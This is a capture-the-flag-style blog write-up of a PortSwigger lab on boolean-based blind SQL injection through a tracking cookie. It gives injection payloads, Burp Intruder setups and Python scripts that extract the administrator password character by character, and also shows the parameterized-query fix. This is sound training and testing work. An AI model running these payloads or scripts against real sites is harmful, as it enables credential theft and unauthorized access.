---
layout: writeup
title: "Blind SQLi: Conditional Responses"
platform: "PortSwigger"
os: "Web"
difficulty: "Practitioner"
date: 2025-12-05
tags: [sql-injection, blind-sqli, bscp, python, burp-suite]
excerpt: "Exploiting boolean-based blind SQL injection to extract credentials character by character using conditional responses."
toc:
  - title: "Lab Overview"
    anchor: "lab-overview"
  - title: "Understanding Blind SQLi"
    anchor: "understanding-boolean-based-blind-sql-injection"
  - title: "Confirming the Vulnerability"
    anchor: "phase-1-confirming-the-vulnerability"
  - title: "Database Fingerprinting"
    anchor: "phase-2-database-fingerprinting"
  - title: "Password Length"
    anchor: "phase-3-password-length-determination"
  - title: "Character Extraction"
    anchor: "phase-4-character-by-character-extraction"
  - title: "Lab Completion"
    anchor: "phase-6-lab-completion"
  - title: "Key Concepts"
    anchor: "key-concepts-summary"
---

# Blind SQL Injection: Exploiting Conditional Responses for Credential Extraction

## The Blind Injection Landscape

SQL injection vulnerabilities don't always announce themselves. Classic injection attacks rely on error messages or direct query output to extract data, but modern applications increasingly suppress these signals. Error pages are generic. Query results never reach the browser. From the attacker's perspective, the database might as well be a black box.

Blind SQL injection changes the question. Rather than asking "what did the database return?", attackers ask "did the database return anything at all?" This binary distinction, presence versus absence, becomes the foundation for extracting arbitrary data from systems that appear completely opaque.

The technique relies on a fundamental observation: applications behave differently depending on query results. A login page might display "Welcome back" for valid sessions. A search might show "No results found" for empty queries. These behavioral differences, however subtle, create an information channel. By crafting queries that conditionally return results, attackers transform yes/no answers into complete database contents.

This write-up documents the exploitation of a blind SQL injection vulnerability in a PortSwigger Web Security Academy lab. The lab simulates a tracking cookie vulnerable to injection, where a simple behavioral difference (the presence or absence of a welcome message) enables complete credential extraction.

## Lab Overview

**Platform:** PortSwigger Web Security Academy

**Lab Name:** Blind SQL injection with conditional responses

**Context:** This write-up is part of my preparation for the **Burp Suite Certified Practitioner (BSCP)** examination. The BSCP certification requires hands-on exploitation skills across various web vulnerabilities, and blind SQL injection is a fundamental technique that appears frequently in the exam.

**Vulnerability:** The application uses a tracking cookie for analytics, performing an unsanitized SQL query with the cookie value. Query results aren't returned to the user, and no error messages are displayed.

**Observable Behavior:** The application includes a "Welcome back" message when the query returns any rows.

**Objective:** Extract the administrator password from the `users` table and authenticate.

## Understanding Boolean-Based Blind SQL Injection

### The Mechanics of Inference

Boolean-based blind SQL injection exploits the fact that SQL queries return different result sets based on conditions. Consider a simple tracking query:

```sql
SELECT * FROM tracking WHERE id = 'abc123'
```

If the tracking ID exists, the query returns rows. If it doesn't exist, the query returns nothing. The application then behaves differently based on this result, perhaps showing personalized content for known users.

An attacker who controls part of this query can append conditions:

```sql
SELECT * FROM tracking WHERE id = 'abc123' AND 1=1
```

The `AND 1=1` condition is always true, so it doesn't change the query's behavior. But what about:

```sql
SELECT * FROM tracking WHERE id = 'abc123' AND 1=2
```

Now the condition is always false. Even if 'abc123' exists in the tracking table, the overall WHERE clause evaluates to false, returning no rows. The application behaves as if the user is unknown.

This creates a binary oracle. By replacing `1=1` and `1=2` with meaningful conditions about the database, attackers can ask arbitrary yes/no questions:

- Does a table named 'users' exist?
- Does the administrator's password start with 'a'?
- Is the password longer than 10 characters?

Each question requires a separate HTTP request, but the answers accumulate into complete information.

### Why Applications Are Vulnerable

The vulnerability exists because developers trust cookie values. The tracking implementation likely resembles:

```python
# Vulnerable backend pseudocode
tracking_id = request.cookies.get('TrackingId')
query = f"SELECT * FROM tracking WHERE id = '{tracking_id}'"
result = database.execute(query)

if len(result) > 0:
    response.include("Welcome back!")
```

The tracking ID is inserted directly into the SQL query without parameterization or sanitization. Single quotes in the cookie value break out of the string context, allowing arbitrary SQL injection.

The fix is straightforward, parameterized queries prevent the injection entirely:

```python
# Secure implementation
tracking_id = request.cookies.get('TrackingId')
query = "SELECT * FROM tracking WHERE id = ?"
result = database.execute(query, [tracking_id])
```

But vulnerable implementations persist across countless applications, making blind SQL injection a reliable attack vector.

## Phase 1: Confirming the Vulnerability

### Initial Reconnaissance

In this PortSwigger lab, the injection point is already identified for us: the `TrackingId` cookie. In real-world scenarios, discovering the injection point would require testing all user-controllable inputs (cookies, headers, GET/POST parameters) with various payloads.

Intercepting a request with Burp Suite reveals:

```http
GET / HTTP/1.1
Host: 0a8300ff04ec253580800d7400e00070.web-security-academy.net
Cookie: TrackingId=qCVrRO8js6JMBwOm; session=tdddb44Vso0151pYm5Dof4iMxjRi8sCB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```


The `TrackingId` cookie contains a seemingly random identifier. This value is passed to the backend and incorporated into a SQL query.

### Testing for Injection

The classic test for SQL injection involves breaking the query syntax with a single quote:

```
TrackingId=qCVrRO8js6JMBwOm'
```

If the application is vulnerable, this creates invalid SQL:

```sql
SELECT * FROM tracking WHERE id = 'qCVrRO8js6JMBwOm''
```

However, in blind injection scenarios, syntax errors might not produce visible changes. A more reliable test uses boolean conditions.

**True condition test:**
```
TrackingId=qCVrRO8js6JMBwOm' AND '1'='1'-- -
```

This payload:
1. Closes the original string with `'`
2. Adds an always-true condition `AND '1'='1'`
3. Comments out the rest of the query with `-- -`

The resulting SQL:
```sql
SELECT * FROM tracking WHERE id = 'qCVrRO8js6JMBwOm' AND '1'='1'-- -'
```

If "Welcome back" appears, the injection works and the true condition returns results.

**False condition test:**
```
TrackingId=qCVrRO8js6JMBwOm' AND '1'='2'-- -
```

This creates an always-false condition. If "Welcome back" disappears, we've confirmed control over the query's boolean result.

### Understanding the Comment Syntax

The `-- -` comment sequence deserves explanation. In SQL, `--` begins a single-line comment, but many databases require whitespace after the dashes. The trailing space can be problematic in URL-encoded contexts, so pentesters often use `-- -` (dashes, space, dash) to ensure the comment is properly recognized. The final dash is simply absorbed into the comment.

Alternative comment styles exist for different databases:
- MySQL: `#` or `-- -`
- PostgreSQL: `-- -`
- Oracle: `-- -`
- MSSQL: `-- -`

## Phase 2: Database Fingerprinting

### Identifying the Database Management System

Different databases use different SQL syntax. Before crafting extraction queries, identifying the backend database ensures payload compatibility.

**Column count enumeration with ORDER BY:**

The ORDER BY clause can identify how many columns the original query returns:

```sql
' ORDER BY 1-- -    → Valid if query has ≥1 column
' ORDER BY 2-- -    → Valid if query has ≥2 columns
' ORDER BY 3-- -    → Invalid if query has <3 columns
```

When the ORDER BY number exceeds the column count, the query fails. In this specific lab, a failed query means no rows are returned, so the "Welcome back" message disappears. In other blind injection scenarios, the indicator could be entirely different: a change in response length, a different HTTP status code, or a variation in response time.

**DBMS-specific syntax testing:**

The most important distinction when crafting injection payloads is between **Oracle** and **non-Oracle databases**. Oracle requires a FROM clause in every SELECT statement, even when selecting literals:

| Database | Test Payload | Notes |
|----------|--------------|-------|
| Non-Oracle | `' UNION SELECT NULL-- -` | PostgreSQL, MySQL, MSSQL |
| Oracle | `' UNION SELECT NULL FROM DUAL-- -` | Requires FROM DUAL |

If your payload works without FROM DUAL, you're dealing with a non-Oracle database. If it fails and only works with FROM DUAL, it's Oracle.


### Confirming Table Structure

The lab description mentions a `users` table with `username` and `password` columns. Even with this information, confirming the structure ensures our extraction queries will work.

**Table existence check:**
```sql
TrackingId=xxx' AND (SELECT 'a' FROM users LIMIT 1)='a'-- -
```

This subquery attempts to select a literal value from the users table. If the table exists and contains at least one row, the subquery returns 'a', making the overall condition true. The LIMIT 1 clause ensures we only check for existence, not count.

**Important:** In this lab, a successful query (one that returns rows) triggers the "Welcome back" message. This is the specific indicator PortSwigger chose for this exercise. In real-world applications, you would need to identify what behavioral difference exists between successful and unsuccessful queries, which could be anything from response size differences to timing variations.

**Column existence check:**
```sql
TrackingId=xxx' AND (SELECT username FROM users WHERE username='administrator')='administrator'-- -
```

If "Welcome back" appears, both the `username` column exists and an 'administrator' user is present.

## Phase 3: Password Length Determination

Before extracting the password character by character, determining its length optimizes the extraction process. Without knowing the length, we might continue testing positions that don't exist, wasting requests.

### The LENGTH Function

SQL's LENGTH function returns the character count of a string:

```sql
LENGTH('password') = 8  → TRUE
LENGTH('password') = 7  → FALSE
```

Applied to our blind injection:

```sql
TrackingId=xxx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a'-- -
```

This query returns results only if:
1. A user named 'administrator' exists
2. That user's password is exactly 20 characters long

### Automating Length Discovery with Burp Suite Intruder

Manual testing of every possible length (1 through 50+) is tedious. Burp Suite's Intruder automates this process:

1. **Send request to Intruder** (Ctrl+I)
2. **Configure attack type:** Simple list (a-zA-z) and (0-9)
3. **Mark payload position:**
   ```sql
   TrackingId=xxx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a'-- -
   ```
4. **Add grep match rule:** Search for "Welcome back"
5. **Execute attack**

**Interpreting results:**

| Payload | Status | Response Length | Welcome back |
|---------|--------|-----------------|--------------|
| 18 | 200 | 59 | X |
| 19 | 200 | 59 | X |
| **20** | 200 | **70** | **✓** |
| 21 | 200 | 59 | X |

The password is 20 characters long. The response length difference reflects the additional "Welcome back" content.

### Python Automation Script

For repeatability and documentation, a Python script provides better control:

```python
#!/usr/bin/env python3
"""
Blind SQLi Password Length Discovery
Determines the password length using boolean-based blind injection
"""

import requests
from termcolor import colored
from pwn import log

# ===== Configuration =====
TARGET_URL = "https://TARGET.web-security-academy.net/"
TRACKING_ID_BASE = "YOUR_TRACKING_ID"
SESSION_COOKIE = "YOUR_SESSION_COOKIE"
TARGET_TABLE = "users"
TARGET_COLUMN = "password"
TARGET_USER = "administrator"
SUCCESS_INDICATOR = "Welcome back"
MAX_LENGTH = 50
# =========================

def discover_password_length():
    """Iterate through possible lengths until the correct one is found."""
    
    progress = log.progress("Testing length")
    
    for length in range(1, MAX_LENGTH + 1):
        # Construct the injection payload
        payload = (
            f"{TRACKING_ID_BASE}' AND (SELECT 'a' FROM {TARGET_TABLE} "
            f"WHERE username='{TARGET_USER}' "
            f"AND LENGTH({TARGET_COLUMN})={length})='a'-- -"
        )
        
        cookies = {
            "TrackingId": payload,
            "session": SESSION_COOKIE
        }
        
        progress.status(f"Length = {length}")
        
        response = requests.get(TARGET_URL, cookies=cookies)
        
        if SUCCESS_INDICATOR in response.text:
            progress.success(f"Password length: {colored(str(length), 'green')}")
            return length
    
    progress.failure(f"Length not found (tested up to {MAX_LENGTH})")
    return None

if __name__ == "__main__":
    discover_password_length()
```

**Execution output:**
```
[◣] SQLI Length Checker: qCVrRO8js6JMBwOm' and (select 'a' from users where username='administrator' and length(password)=20)='a'-- -
[◑] Testing length: Length = 20

[+] Password length found: 20
[*] You can use PASSWORD_MAX_LENGTH = 21 in blind-sqli.py
```

## Phase 4: Character-by-Character Extraction

With the password length known, extraction proceeds one character at a time. This is where blind SQL injection reveals its true nature: patient, methodical, but ultimately complete data exfiltration.

### The SUBSTRING Function

SQL's SUBSTRING (or SUBSTR) function extracts portions of strings:

```sql
SUBSTRING(string, start_position, length)

SUBSTRING('password', 1, 1) = 'p'   -- First character
SUBSTRING('password', 2, 1) = 'a'   -- Second character
SUBSTRING('password', 8, 1) = 'd'   -- Eighth character
```

**Note:** SQL string positions are 1-indexed, not 0-indexed like most programming languages.

### Constructing the Extraction Query

For each position, we test every possible character:

```sql
TrackingId=xxx' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- -
```

This asks: "Is the first character of the administrator's password equal to 'a'?"

If "Welcome back" appears → Yes, the character is 'a'
If "Welcome back" doesn't appear → No, try the next character

The character space typically includes:
- Lowercase letters: a-z (26 characters)
- Digits: 0-9 (10 characters)
- Uppercase letters: A-Z (26 characters, if applicable)
- Special characters: varies by password policy

### Complexity Analysis

For a 20-character password with a 36-character alphabet (lowercase + digits):

- **Worst case:** 20 × 36 = 720 requests
- **Average case:** 20 × 18 = 360 requests (finding each character midway through the alphabet)
- **Best case:** 20 requests (if every character is 'a')

At 10 requests per second, extraction completes in approximately 36-72 seconds. This efficiency makes blind injection practical despite its apparent limitations.

### Burp Suite Cluster Bomb Attack

For simultaneous position and character testing, Intruder's Cluster Bomb mode creates all combinations:

1. **Configure attack type:** Cluster Bomb (multiple payload sets)
2. **Mark two positions:**
   ```sql
   TrackingId=xxx' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'-- -
   ```
3. **Payload Set 1 (position):** Numbers 1-20
4. **Payload Set 2 (character):** a-z, 0-9
5. **Add grep match rule:** "Welcome back"
6. **Execute attack**

**Extracting results:**

Filter results by the "Welcome back" column. Sort by payload position to reconstruct the password:

| Position | Character | Welcome back |
|----------|-----------|--------------|
| 1 | e | ✓ |
| 2 | 7 | ✓ |
| 3 | u | ✓ |
| ... | ... | ... |
| 20 | p | ✓ |

### Complete Python Extraction Script

The following script automates the entire extraction process:

```python
#!/usr/bin/env python3
"""
Blind SQLi Password Extraction
Extracts password character by character using boolean-based blind injection
"""
from termcolor import colored
import requests
import sys
import string
import time
from pwn import log

# ===== global config =====
TARGET_URL = "https://0aff009c0473b3e6806cf392004300c1.web-security-academy.net/"
TRACKING_ID_BASE = "K0aP1HIH0YB2irj6"
SESSION_COOKIE = "j16EURWNUV2Igo0jJqnzY7DLPQtl1D1W"
TARGET_TABLE = "users"
TARGET_COLUMN = "password"
TARGET_USER = "administrator"
SUCCESS_MESSAGE = "Welcome back"
PASSWORD_MAX_LENGTH = 21
CHARACTERS = string.ascii_lowercase + string.digits
# =================================

p1 = log.progress("SQLI")

def blindSQLi():
    p1.status("Starting brute force attack")
    time.sleep(2)

    password = ""
    p2 = log.progress("Password")

    for position in range(1, PASSWORD_MAX_LENGTH):
        for character in CHARACTERS:
            cookies = {
                "TrackingId": f"{TRACKING_ID_BASE}' and (select substring({TARGET_COLUMN},{position},1) from {TARGET_TABLE} where username='{TARGET_USER}')='{character}'-- -",
                "session": SESSION_COOKIE
            }

            p1.status(cookies["TrackingId"])

            r = requests.get(TARGET_URL, cookies=cookies)

            if SUCCESS_MESSAGE in r.text:
                password += character
                p2.status(password)
                break

if __name__ == "__main__":
    blindSQLi()
```

**Execution output:**
```
[◒] SQLi Payload: qCVrRO8js6JMBwOm' AND (SELECT SUBSTRING(password,1,1)...
[+] Password: *******
```
### Binary Search Optimization

Rather than testing each character sequentially (O(n) per position), binary search reduces complexity to O(log n):

```sql
-- Instead of: is char = 'a'? is char = 'b'? is char = 'c'?
-- Ask: is char > 'm'?

' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator') > 109-- -
```

The ASCII function converts a character to its numeric value, enabling greater-than/less-than comparisons. For a 36-character alphabet:

- **Sequential search:** Average 18 requests per character
- **Binary search:** Maximum 6 requests per character (log₂(36) ≈ 5.17)

For a 20-character password:
- **Sequential:** ~360 requests
- **Binary search:** ~120 requests (3x faster)

### Conditional Response Variations

The "Welcome back" message used in this PortSwigger lab is just one example of a conditional response. Real-world applications may exhibit different indicators:

| Indicator Type | Detection Method | Example |
|----------------|------------------|---------|
| **Text presence** | Specific string appears/disappears | "Welcome back", "Login successful" |
| **Response length** | Compare byte counts between true/false conditions | 3521 bytes vs 3456 bytes |
| **HTTP status codes** | Different codes for valid vs invalid queries | 200 vs 500 |
| **Response time** | Time-based blind injection using SLEEP() | 5 second delay vs instant |
| **Redirect behavior** | Different redirect targets based on query results | /dashboard vs /login |
| **Cookie changes** | Session cookie modifications | New session ID issued |

When testing real applications, identifying the correct indicator is often the most challenging part of blind SQL injection exploitation.

## Phase 6: Lab Completion

With the extracted password, authentication is straightforward:

1. Navigate to the login page
2. Enter credentials:
   - **Username:** `administrator`
   - **Password:** `***********`
3. Submit the login form


**Lab solved ✓**

## Key Concepts Summary

### Boolean-Based Blind SQL Injection

Infers database contents through observable application behavior differences. The attacker never sees direct query output but reconstructs information through thousands of yes/no questions. This technique works against any application that exhibits detectable behavioral differences based on query results.

### Conditional Responses

The mechanism that makes blind injection possible. Any detectable difference between query-returns-results and query-returns-nothing becomes an information channel. In this PortSwigger lab, the indicator is the "Welcome back" text. In production applications, indicators vary widely and may be subtle (a few bytes difference in response size, milliseconds of timing variation, etc.).

### Substring Extraction

The character-by-character technique that transforms binary responses into complete data. Combined with length detection, enables full credential extraction from any accessible column. This method is database-agnostic, the SUBSTRING function exists in virtually all SQL implementations.

### Automation Necessity

Manual blind injection is theoretically possible but practically infeasible. For a 20-character password with 36 possible characters per position, you're looking at hundreds of requests. Extraction tools transform hours of tedious work into minutes of automated querying.

## Conclusion

This PortSwigger lab demonstrates that security through obscurity fails. Hiding error messages and suppressing query output creates an illusion of security while leaving the fundamental vulnerability intact. Attackers adapt their techniques, trading direct output for patient inference.

The extraction process documented here, determining password length, then extracting character by character, applies universally to boolean-based blind injection. The specific indicator ("Welcome back") is unique to this lab, but the methodology remains constant across any application exhibiting conditional responses.

Effective defense requires addressing the root cause: unsanitized input reaching SQL queries. Parameterized queries eliminate the vulnerability entirely, making all extraction techniques irrelevant. Until organizations universally adopt this practice, blind SQL injection remains a reliable attack vector for penetration testers and malicious actors alike.

---

**Lab:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Technique:** Blind SQL Injection with Conditional Responses

## References

- [PortSwigger: SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger: Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP: Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
